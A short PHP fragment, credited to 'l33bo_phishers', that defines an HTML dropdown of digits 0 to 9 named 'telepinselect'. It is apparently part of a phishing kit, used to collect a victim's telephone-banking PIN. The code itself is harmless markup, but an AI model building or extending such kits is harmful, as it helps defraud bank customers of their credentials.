<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
define("telepinselect", "
<option value='-'>Please enter...</option>
<option value='0'>&nbsp;0</option>
<option value='1'>&nbsp;1</option>
<option value='2'>&nbsp;2</option>
<option value='3'>&nbsp;3</option>
<option value='4'>&nbsp;4</option>
<option value='5'>&nbsp;5</option>
<option value='6'>&nbsp;6</option>
<option value='7'>&nbsp;7</option>
<option value='8'>&nbsp;8</option>
<option value='9'>&nbsp;9</option>
");